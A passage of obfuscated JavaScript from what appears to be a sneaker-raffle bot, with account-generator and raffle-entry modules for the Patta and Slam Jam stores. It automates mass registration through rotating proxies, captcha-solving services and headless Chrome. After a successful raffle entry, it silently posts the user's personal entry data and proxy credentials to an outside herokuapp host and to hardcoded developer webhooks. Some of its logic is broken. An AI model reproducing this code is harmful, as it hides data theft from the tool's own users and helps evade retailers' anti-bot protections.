                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x3c3586, _0x2c7790) {
                                    if (!_0x2c7790 || !_0x2c7790['length'])
                                        console['log'](_0x24b1d6() + '\x20[' + _0x5dcb1d['name'] + ']\x20No\x20mails\x20found'), _0x7de1e4['end']();
                                    else {
                                        var _0x3aedb6 = _0x7de1e4['seq']['fetch'](_0x2c7790, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x3aedb6['on']('message', function (_0x2666e9, _0x4cd431) {
                                            var _0x2f991e = '(#' + _0x4cd431 + ')\x20';
                                            _0x2666e9['on']('body', function (_0x569234, _0x448f44) {
                                                _0x3020dc(_0x569234, (_0x2e403b, _0x49e51c) => {
                                                    var _0x23c7f8 = _0x49e51c['text']['split']('(')[0x1], _0x3ac1fa = _0x23c7f8['split'](')')[0x0];
                                                    _0x4e7fb1['push'](_0x3ac1fa);
                                                });
                                            }), _0x2666e9['once']('end', function () {
                                            });
                                        }), _0x3aedb6['once']('error', function (_0x287d5d) {
                                            console['log']('Fetch\x20error:\x20' + _0x287d5d), _0x1fe025 = !![];
                                        }), _0x3aedb6['once']('end', function () {
                                            _0x7de1e4['end'](), _0x1fe025 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x7de1e4['once']('error', function (_0xc34b4c) {
                            console['log'](_0xc34b4c), _0x1fe025 = !![];
                        }), _0x7de1e4['once']('end', async function () {
                            _0x1fe025 = !![];
                        }), _0x7de1e4['connect']();
                    }
                    async function _0x4cde96(_0xa880e4, _0x516314, _0x5e9990) {
                        for (var _0x29c118 = 0x0; _0x29c118 < _0x516314['length']; _0x29c118++) {
                            async function _0x3ee96d(_0x46a2bd, _0x26df56, _0x541192, _0x299397, _0x1befb7) {
                                var _0x4e2998, _0x524223 = {}, _0x5f0d46 = [], _0x5246e8 = {}, _0x3ff93e = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x4bb6b1 = Math['round'](Math['random']() * (_0x3ff93e['length'] - 0x1));
                                _0x299397[_0x46a2bd]['Size'] == 'RANDOM' && (_0x299397[_0x46a2bd]['Size'] = _0x3ff93e[_0x4bb6b1]);
                                !_0x299397 && (_0x299397 = {});
                                if (_0x2795a0['useRandomProxy'] = ![])
                                    var _0x4616e7 = _0x1befb7[_0x46a2bd]['split'](':');
                                else
                                    var _0x1a4a57 = Math['round'](Math['random']() * (_0x1befb7['length'] - 0x1)), _0x4616e7 = _0x1befb7[_0x1a4a57]['split'](':');
                                var _0x38fc3d = {
                                    'jar': _0x40df6f,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x541192['url'],
                                    'headers': _0x541192['headers'],
                                    'body': JSON['stringify'](_0x524223),
                                    'proxy': 'http://' + _0x4616e7[0x2] + ':' + _0x4616e7[0x3] + '@' + _0x4616e7[0x0] + ':' + _0x4616e7[0x1]
                                };
                                return _0x26df56 != 'ver' && (_0x38fc3d['url'] = _0x541192['url'], _0x38fc3d['headers'] = _0x541192['headers']), _0x26df56 == 'ver' && (_0x38fc3d['method'] = 'GET', _0x38fc3d['url'] = _0x299397[_0x46a2bd]), new Promise(function (_0x16c0b7, _0xbeffbd) {
                                    callback = async (_0x8f76d9, _0x460cb6, _0x4ef1c0) => {
                                        if (!_0x8f76d9 && _0x460cb6['statusCode'] == 0xca || !_0x8f76d9 && _0x460cb6['statusCode'] == 0xc8) {
                                            if (_0x26df56 != 'ver') {
                                                var _0xe4cbd7 = await _0x258e8b(_0x299397[_0x46a2bd], _0x541192, 'dev', ![]), _0x4d0cd8 = await _0x258e8b(_0x299397[_0x46a2bd], _0x541192, 'pub', ![]);
                                                const _0x561427 = {
                                                    'succesDEVMSG': { 'embeds': [_0xe4cbd7] },
                                                    'succesPUBMSG': { 'embeds': [_0x4d0cd8] }
                                                };
                                                if (_0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '')
                                                    try {
                                                        await _0x310f97(_0x2795a0['webhook'], _0x561427['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0xa2099c(0xc8), await _0x310f97(_0x8cde2d, _0x561427['succesDEVMSG']), await _0xa2099c(0xc8);
                                                try {
                                                    await _0x310f97(_0x44d24a, _0x561427['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x48af7e(_0x299397[_0x46a2bd], _0x541192);
                                            }
                                            _0x16c0b7(console['log'](_0x536226['green'](_0x24b1d6() + '\x20[' + _0x541192['name'] + ']\x20Task\x20' + (_0x46a2bd + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x26df56 != 'ver') {
                                                var _0x195e64 = '' + _0x8f76d9, _0x532eb0 = await _0x258e8b(_0x299397[_0x46a2bd], _0x541192, 'dev', !![], _0x195e64), _0xf2a5e9 = {};
                                                _0xf2a5e9['errorDEV'] = { 'embeds': [_0x532eb0] }, _0x391951(_0x299397[_0x46a2bd], _0x541192), _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0xf2a5e9['errorDEV']), await _0x310f97(_0x281108, _0xf2a5e9['errorDEV']);
                                            }
                                            _0xbeffbd(console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x541192['name'] + ']\x20Task\x20' + (_0x46a2bd + 0x1) + ':\x20' + _0x8f76d9)));
                                        }
                                    };
                                    try {
                                        _0x26df56 != 'ver' ? console['log'](_0x24b1d6() + '\x20[' + _0x541192['name'] + ']\x20Task\x20' + (_0x46a2bd + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x524223['data']['attributes']['email']) : console['log'](_0x24b1d6() + '\x20[' + _0x541192['name'] + ']\x20Task\x20' + (_0x46a2bd + 0x1) + ':\x20Fetching\x20Response'), _0x45876e(_0x38fc3d, callback);
                                    } catch (_0x40af9c) {
                                        console['log'](_0x24b1d6() + '\x20Task\x20' + (_0x46a2bd + 0x1) + ':\x20' + _0x40af9c);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x3ee96d(_0x29c118, 'ver', _0xa880e4, _0x516314, _0x5e9990), console['log'](_0x24b1d6() + '\x20[' + _0xa880e4['name'] + ']\x20Sleeping\x20for\x20' + _0x2795a0['delay'] + '\x20ms'), await _0xa2099c(_0x2795a0['delay']);
                            } catch (_0x304ca6) {
                            }
                        }
                    }
                    try {
                        _0x270fe6();
                        while (!_0x1fe025) {
                            await _0xa2099c(0xfa0);
                        }
                        console['log']('Found\x20' + _0x4e7fb1['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x4cde96(_0x5dcb1d, _0x4e7fb1, _0x4b5b6e);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x22b1af, _0x4f0fb2, _0x11db4f) {
                    _0xfda795['use'](_0x442f24()), _0xfda795['use'](_0x5943b7({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x2795a0['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1a29c7 = 0x0; _0x1a29c7 < _0x4f0fb2['length']; _0x1a29c7++) {
                        var _0x42d168 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x1bdb7f
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x2795a0['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x39dec1
                                }
                            ]
                        }];
                        const _0x5824fe = { 'embeds': _0x42d168 };
                        _0x215576(_0x22b1af['name'] + '\x20Task\x20' + (_0x1a29c7 + 0x1) + '\x20/\x20' + _0x4f0fb2['length'] + '\x20||\x20File:\x20' + _0x47dda7 + '\x20Proxies:\x20' + _0x5184f4);
                        try {
                            await _0x53ad15(_0x4f0fb2, _0x1a29c7);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x133229 = await _0x258e8b(_0x4f0fb2[_0x1a29c7], _0x22b1af, 'acc', ![]);
                        const _0x1c869b = { 'succesDEVMSG': { 'embeds': [_0x133229] } };
                        if (_0x4f0fb2[_0x1a29c7]['Email'] == '' || _0x4f0fb2[_0x1a29c7]['FirstName'] == '' || _0x4f0fb2[_0x1a29c7]['LastName'] == '') {
                            console['log'](_0x24b1d6() + '\x20[' + _0xabefbd[taskModule]['name'] + ']\x20Task\x20' + (_0x1a29c7 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0xa2099c(0x7d0);
                            continue;
                        }
                        (_0x4f0fb2[_0x1a29c7]['Password'] == '' || _0x4f0fb2[_0x1a29c7] == undefined) && _0x4f0fb2[_0x1a29c7]['Password'] == 'JRaffles23!';
                        if (_0x2795a0['useRandomProxy'] = ![])
                            var _0x116757 = _0x11db4f[_0x1a29c7]['split'](':');
                        else
                            var _0x1cd565 = Math['round'](Math['random']() * (_0x11db4f['length'] - 0x1)), _0x116757 = _0x11db4f[_0x1cd565]['split'](':');
                        var _0x26a48c;
                        try {
                            _0x26a48c = await _0xfda795['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x116757[0x0] + ':' + _0x116757[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x26a48c = await _0xfda795['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x116757[0x0] + ':' + _0x116757[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x373be6 = await _0x26a48c['newPage']();
                            await _0x373be6['authenticate']({
                                'username': '' + _0x116757[0x2],
                                'password': '' + _0x116757[0x3]
                            }), console['log'](_0x24b1d6() + '\x20[' + _0x22b1af['name'] + ']\x20Task\x20' + (_0x1a29c7 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x373be6['setRequestInterception'](!![]), _0x373be6['on']('request', _0x5a5534 => {
                                _0x5a5534['resourceType']() === 'image' || _0x5a5534['resourceType']() === 'font' || _0x5a5534['resourceType']() === 'media' ? _0x5a5534['abort']() : _0x5a5534['continue']();
                            }), await _0x373be6['goto']('https://patta.nl/account/register'), await _0xa2099c(0xbb8), await _0x373be6['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x24b1d6() + '\x20[' + _0x22b1af['name'] + ']\x20Task\x20' + (_0x1a29c7 + 0x1) + '\x20:\x20Filling\x20information'), await _0x373be6['type']('#RegisterForm-FirstName', '' + _0x4f0fb2[_0x1a29c7]['FirstName']), await _0xa2099c(0x226), await _0x373be6['type']('#RegisterForm-LastName', '' + _0x4f0fb2[_0x1a29c7]['LastName']), await _0xa2099c(0x226), await _0x373be6['type']('#RegisterForm-email', '' + _0x4f0fb2[_0x1a29c7]['Email']), await _0xa2099c(0x226), await _0x373be6['type']('#RegisterForm-password', '' + _0x4f0fb2[_0x1a29c7]['Password']), await _0xa2099c(0x226), console['log'](_0x24b1d6() + '\x20[' + _0x22b1af['name'] + ']\x20Task\x20' + (_0x1a29c7 + 0x1) + '\x20:\x20Submitting..'), await _0x373be6['$eval']('#RegisterForm', _0x541638 => _0x541638['submit']()), await _0xa2099c(0x1f40);
                            try {
                                await _0x373be6['waitForSelector']('.home-page-grid__collection'), await _0xa2099c(0x1f4), console['log'](_0x536226['green'](_0x24b1d6() + '\x20[' + _0x22b1af['name'] + ']\x20Task\x20' + (_0x1a29c7 + 0x1) + '\x20:\x20Account\x20' + _0x4f0fb2[_0x1a29c7]['Email'] + '\x20Generated!')), _0x376369['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x4f0fb2[_0x1a29c7]['Email'] + ',' + _0x4f0fb2[_0x1a29c7]['Password']), console['log'](_0x536226['yellow'](_0x24b1d6() + '\x20[' + _0x22b1af['name'] + ']\x20Task\x20' + (_0x1a29c7 + 0x1) + '\x20:\x20Account\x20' + _0x4f0fb2[_0x1a29c7]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x1c869b['succesDEVMSG']);
                                } catch {
                                }
                                await _0x310f97(_0x203e00, _0x1c869b['succesDEVMSG']);
                            } catch (_0x4be2eb) {
                                console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0xabefbd[taskModule]['name'] + ']\x20Task\x20' + (_0x1a29c7 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x4be2eb));
                            }
                        } catch (_0x599aab) {
                            console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0xabefbd[taskModule]['name'] + ']\x20Task\x20' + (_0x1a29c7 + 0x1) + '\x20:\x20' + _0x599aab));
                        } finally {
                            _0x26a48c && _0x26a48c['close'](), console['log']('Waiting\x20for\x20' + _0x2795a0['delay'] + '\x20ms'), await _0xa2099c(_0x2795a0['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x273964, _0x321a90, _0x46fd87) {
                    _0xfda795['use'](_0x442f24()), _0xfda795['use'](_0x5943b7({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x2795a0['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xbc0095 = 0x0; _0xbc0095 < _0x321a90['length']; _0xbc0095++) {
                        var _0x3afd24;
                        if (_0x4de447 != 'yes')
                            var _0x4de447 = '', _0x497079 = 0x0;
                        _0x215576(_0x273964['name'] + '\x20Task\x20' + (_0xbc0095 + 0x1) + '\x20/\x20' + _0x321a90['length'] + '\x20||\x20File:\x20' + _0x47dda7 + '\x20Proxies:\x20' + _0x5184f4);
                        try {
                            await _0x53ad15(_0x321a90, _0xbc0095);
                        } catch {
                            _0x4de447 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x321a90[_0xbc0095]['Email'] == '' || _0x321a90[_0xbc0095]['Password'] == '' || _0x321a90[_0xbc0095]['FirstName'] == '' || _0x321a90[_0xbc0095]['LastName'] == '') {
                            console['log'](_0x24b1d6() + '\x20[' + _0xabefbd[taskModule]['name'] + ']\x20Task\x20' + (_0xbc0095 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x2795a0['useRandomProxy'] = ![])
                            var _0x2c2611 = _0x46fd87[_0xbc0095]['split'](':');
                        else
                            var _0x470eea = Math['round'](Math['random']() * (_0x46fd87['length'] - 0x1)), _0x2c2611 = _0x46fd87[_0x470eea]['split'](':');
                        var _0x3cf098;
                        try {
                            _0x3cf098 = await _0xfda795['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2c2611[0x0] + ':' + _0x2c2611[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3cf098 = await _0xfda795['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2c2611[0x0] + ':' + _0x2c2611[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2c6a85 = await _0x3cf098['newPage']();
                            await _0x2c6a85['authenticate']({
                                'username': '' + _0x2c2611[0x2],
                                'password': '' + _0x2c2611[0x3]
                            }), console['log'](_0x24b1d6() + '\x20[' + _0x273964['name'] + ']\x20Task\x20' + (_0xbc0095 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2c6a85['setRequestInterception'](!![]), _0x2c6a85['on']('request', _0x3b33ca => {
                                _0x3b33ca['resourceType']() === 'image' || _0x3b33ca['resourceType']() === 'font' || _0x3b33ca['resourceType']() === 'media' ? _0x3b33ca['abort']() : _0x3b33ca['continue']();
                            }), await _0x2c6a85['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x2c6a85['waitForSelector']('#CustomerEmail'), console['log'](_0x24b1d6() + '\x20[' + _0x273964['name'] + ']\x20Task\x20' + (_0xbc0095 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x2c6a85['type']('#CustomerEmail', '' + _0x321a90[_0xbc0095]['Email']), await _0xa2099c(0x12c), await _0x2c6a85['type']('#CustomerPassword', '' + _0x321a90[_0xbc0095]['Password']), await _0xa2099c(0x226), await _0x2c6a85['$eval']('#customer_login', _0x529a2b => _0x529a2b['submit']());
                            try {
                                await _0x2c6a85['waitForSelector']('#orders'), await _0xa2099c(0x4b0);
                            } catch {
                                console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x273964['name'] + ']\x20Task\x20' + (_0xbc0095 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x2c6a85['goto']('' + _0x321a90[_0xbc0095]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0xa2099c(0xbb8), console['log'](_0x24b1d6() + '\x20[' + _0x273964['name'] + ']\x20Task\x20' + (_0xbc0095 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x2c6a85['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x273964['name'] + ']\x20Task\x20' + (_0xbc0095 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x2c6a85['type']('#email', '' + _0x321a90[_0xbc0095]['Email']), await _0xa2099c(0x384), await _0x2c6a85['type']('#first_name', '' + _0x321a90[_0xbc0095]['FirstName']), await _0xa2099c(0x514), await _0x2c6a85['type']('#last_name', '' + _0x321a90[_0xbc0095]['LastName']), await _0xa2099c(0x514), await _0x2c6a85['type']('#street_address', _0x321a90[_0xbc0095]['Address1'] + '\x20' + _0x321a90[_0xbc0095]['HouseNumber'] + '\x20' + _0x321a90[_0xbc0095]['Address2']), await _0xa2099c(0x2bc);
                            _0x321a90[_0xbc0095]['Postcode'] == undefined && (_0x321a90[_0xbc0095]['Postcode'] = _0x321a90[_0xbc0095]['Zip']);
                            await _0x2c6a85['type']('#zip_code', '' + _0x321a90[_0xbc0095]['Postcode']), await _0xa2099c(0x320), await _0x2c6a85['type']('#city', '' + _0x321a90[_0xbc0095]['City']), await _0xa2099c(0x320), await _0x2c6a85['type']('#bday', '01/01/1994'), await _0xa2099c(0x320), await _0x2c6a85['type']('#instagram', '' + _0x321a90[_0xbc0095]['Follower']), await _0xa2099c(0x352);
                            if (_0x321a90[_0xbc0095]['Size'] == 'RANDOM') {
                                const _0x4f7964 = await _0x2c6a85['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x15f0a5 => {
                                    return _0x15f0a5['map'](_0x31bb38 => _0x31bb38['textContent']);
                                });
                                var _0x46125a = Math['round'](Math['random']() * (_0x4f7964['length'] - 0x1));
                                console['log'](_0x24b1d6() + '\x20[' + _0x273964['name'] + ']\x20Task\x20' + (_0xbc0095 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x4f7964[_0x46125a]), await _0x2c6a85['click']('label[data-eu-size=\x22' + _0x4f7964[_0x46125a] + '\x22]');
                            } else {
                                console['log'](_0x24b1d6() + '\x20[' + _0x273964['name'] + ']\x20Task\x20' + (_0xbc0095 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x321a90[_0xbc0095]['Size']);
                                try {
                                    await _0x2c6a85['click']('label[data-eu-size=\x22' + _0x321a90[_0xbc0095]['Size'] + '\x22]');
                                } catch {
                                    await _0x2c6a85['click']('label[data-eu-size=\x22' + _0x321a90[_0xbc0095]['Size'] + '.0\x22]');
                                }
                            }
                            await _0xa2099c(0xbb8), await _0x2c6a85['$$eval']('.raffle__checkbox-label', _0x24f86a => _0x24f86a['forEach'](_0x1f7549 => _0x1f7549['click']())), await _0xa2099c(0x7d0), console['log'](_0x24b1d6() + '\x20[' + _0x273964['name'] + ']\x20Task\x20' + (_0xbc0095 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x2c6a85['click']('#raffle__form-submit'), await _0xa2099c(0x1388);
                            try {
                                await _0x2c6a85['waitForSelector']('#raffle__confirmation-message-container'), _0x4de447 = 'no', _0x48af7e(_0x321a90[_0xbc0095], _0x273964), console['log'](_0x536226['green'](_0x24b1d6() + '\x20[' + _0x273964['name'] + ']\x20Task\x20' + (_0xbc0095 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x23a054 = _0x321a90[_0xbc0095];
                                try {
                                    prxdata = {
                                        'username': _0x1bdb7f['replace']('#', ''),
                                        'module': _0x273964['name'],
                                        'entrydata': JSON['stringify'](_0x23a054),
                                        'proxy': '' + _0x46fd87[_0xbc0095]
                                    };
                                    var _0x45845c = JSON['stringify'](prxdata);
                                    let _0x24ff46 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3f36f4['post']('https://jraffles.herokuapp.com/success', _0x45845c, _0x24ff46);
                                } catch (_0x1ec38f) {
                                }
                            } catch (_0x2ee38d) {
                                console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0xabefbd[taskModule]['name'] + ']\x20Task\x20' + (_0xbc0095 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x2ee38d));
                            }
                        } catch (_0x1a8c4c) {
                            console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0xabefbd[taskModule]['name'] + ']\x20Task\x20' + (_0xbc0095 + 0x1) + '\x20:\x20' + _0x1a8c4c)), _0x4de447 = 'yes';
                        } finally {
                            _0x3cf098 && _0x3cf098['close']();
                            if (_0x4de447 == 'yes' && _0x497079 != 0x5 && _0x3afd24 != 'Size\x20Not\x20Found') {
                                console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x273964['name'] + ']\x20Task\x20' + (_0xbc0095 + 0x1) + '\x20:\x20Retrying\x20(' + _0x497079 + '\x20/\x205)')), _0xbc0095 = _0xbc0095 - 0x1, _0x497079 = _0x497079 + 0x1;
                                continue;
                            }
                            _0x4de447 == 'yes' && _0x497079 >= 0x5 && (_0x391951(_0x321a90[_0xbc0095], _0x273964), _0x4de447 = 'no', _0x497079 = 0x0), console['log']('Waiting\x20for\x20' + _0x2795a0['delay'] + '\x20ms'), await _0xa2099c(_0x2795a0['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x39505b, _0xd7d472, _0x474ba4) {
                    _0xfda795['use'](_0x442f24()), _0xfda795['use'](_0x5943b7({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x2795a0['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4bbe2f = 0x0; _0x4bbe2f < _0xd7d472['length']; _0x4bbe2f++) {
                        if (_0x2dc090 != 'yes')
                            var _0x2dc090 = '', _0x26701e = 0x0;
                        var _0x128e7a = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x1bdb7f
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x2795a0['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x39dec1
                                }
                            ]
                        }];
                        const _0x24babc = { 'embeds': _0x128e7a };
                        _0x215576(_0x39505b['name'] + '\x20Task\x20' + (_0x4bbe2f + 0x1) + '\x20/\x20' + _0xd7d472['length'] + '\x20||\x20File:\x20' + _0x47dda7 + '\x20Proxies:\x20' + _0x5184f4);
                        try {
                            await _0x53ad15(_0xd7d472, _0x4bbe2f);
                        } catch {
                            _0x2dc090 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x54d8dd = await _0x258e8b(_0xd7d472[_0x4bbe2f], _0x39505b, 'acc', ![]);
                        const _0x193747 = { 'succesDEVMSG': { 'embeds': [_0x54d8dd] } };
                        if (_0xd7d472[_0x4bbe2f]['Email'] == '' || _0xd7d472[_0x4bbe2f]['FirstName'] == '' || _0xd7d472[_0x4bbe2f]['LastName'] == '') {
                            console['log'](_0x24b1d6() + '\x20[' + _0xabefbd[taskModule]['name'] + ']\x20Task\x20' + (_0x4bbe2f + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0xa2099c(0x7d0);
                            continue;
                        }
                        (_0xd7d472[_0x4bbe2f]['Password'] == '' || _0xd7d472[_0x4bbe2f] == undefined) && _0xd7d472[_0x4bbe2f]['Password'] == 'JRaffles23!';
                        if (_0x2795a0['useRandomProxy'] = ![])
                            var _0x2eecf5 = _0x474ba4[_0x4bbe2f]['split'](':');
                        else
                            var _0x1c0af2 = Math['round'](Math['random']() * (_0x474ba4['length'] - 0x1)), _0x2eecf5 = _0x474ba4[_0x1c0af2]['split'](':');
                        var _0x7f9099;
                        try {
                            _0x7f9099 = await _0xfda795['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2eecf5[0x0] + ':' + _0x2eecf5[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x7f9099 = await _0xfda795['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2eecf5[0x0] + ':' + _0x2eecf5[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x556aa9 = await _0x7f9099['newPage']();
                            await _0x556aa9['authenticate']({
                                'username': '' + _0x2eecf5[0x2],
                                'password': '' + _0x2eecf5[0x3]
                            }), console['log'](_0x24b1d6() + '\x20[' + _0x39505b['name'] + ']\x20Task\x20' + (_0x4bbe2f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x556aa9['setRequestInterception'](!![]), _0x556aa9['on']('request', _0x5d1c8e => {
                                _0x5d1c8e['resourceType']() === 'image' || _0x5d1c8e['resourceType']() === 'font' || _0x5d1c8e['resourceType']() === 'media' ? _0x5d1c8e['abort']() : _0x5d1c8e['continue']();
                            }), await _0x556aa9['goto']('https://drop.slamjam.com/account/register'), await _0xa2099c(0xbb8), await _0x556aa9['waitForSelector']('#FirstName'), await _0x556aa9['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x556aa9['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x24b1d6() + '\x20[' + _0x39505b['name'] + ']\x20Task\x20' + (_0x4bbe2f + 0x1) + '\x20:\x20Filling\x20information'), await _0xa2099c(0x4b0), await _0x556aa9['type']('#FirstName', '' + _0xd7d472[_0x4bbe2f]['FirstName']), await _0xa2099c(0x226), await _0x556aa9['type']('#LastName', '' + _0xd7d472[_0x4bbe2f]['LastName']), await _0xa2099c(0x226), await _0x556aa9['type']('#Email', '' + _0xd7d472[_0x4bbe2f]['Email']), await _0xa2099c(0x2ee), await _0x556aa9['type']('#ConfirmEmail', '' + _0xd7d472[_0x4bbe2f]['Email']), await _0xa2099c(0x2ee), await _0x556aa9['type']('#CreatePassword', '' + _0xd7d472[_0x4bbe2f]['Password']), await _0xa2099c(0x2ee), await _0x556aa9['type']('#CreateConfirmPassword', '' + _0xd7d472[_0x4bbe2f]['Password']), await _0xa2099c(0x226), console['log'](_0x24b1d6() + '\x20[' + _0x39505b['name'] + ']\x20Task\x20' + (_0x4bbe2f + 0x1) + '\x20:\x20Submitting..'), await _0x556aa9['$eval']('#create_customer', _0x11bf1e => _0x11bf1e['submit']()), await _0xa2099c(0x1388), console['log'](_0x24b1d6() + '\x20[' + _0x39505b['name'] + ']\x20Task\x20' + (_0x4bbe2f + 0x1) + '\x20:\x20' + _0x536226['cyan']('Solving\x20Captcha')), await _0x556aa9['solveRecaptchas'](), console['log'](_0x24b1d6() + '\x20[' + 